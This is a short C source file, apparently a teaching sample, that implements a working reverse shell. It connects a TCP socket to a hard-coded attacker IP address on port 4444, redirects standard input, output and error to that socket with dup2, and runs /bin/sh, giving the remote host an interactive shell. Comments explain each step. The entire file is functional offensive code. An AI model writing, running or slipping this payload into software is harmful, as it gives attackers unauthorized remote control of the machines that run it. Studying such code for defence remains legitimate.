#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main()
{
    // IP address of the adversary
    const char *attacker_ip = "192.168.37.37";

    // structure for IP address
    struct sockaddr_in target_address;
    target_address.sin_family = AF_INET;
    target_address.sin_port = htons(4444);
    inet_aton(attacker_ip, &target_address.sin_addr); // It converts a human-readable IPv4 string (like "192.168.1.100") into a binary network format (struct in_addr) that sockets can actually use.`

    // system call to create a socket
    int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);

    // system call to establish a connection
    connect(socket_file_descriptor, (struct sockaddr *)&target_address, sizeof(target_address));

    for (int index = 0; index < 3; index++)
    {
        // dup2(socket_file_descriptor, 0) - link to standard input
        // dup2(socket_file_descriptor, 1) - link to standard output
        // dup2(socket_file_descriptor, 2) - link to standard error
        dup2(socket_file_descriptor, index);
    }
    // system call to execute shell
    execve("/bin/sh", NULL, NULL);
    return 0;
}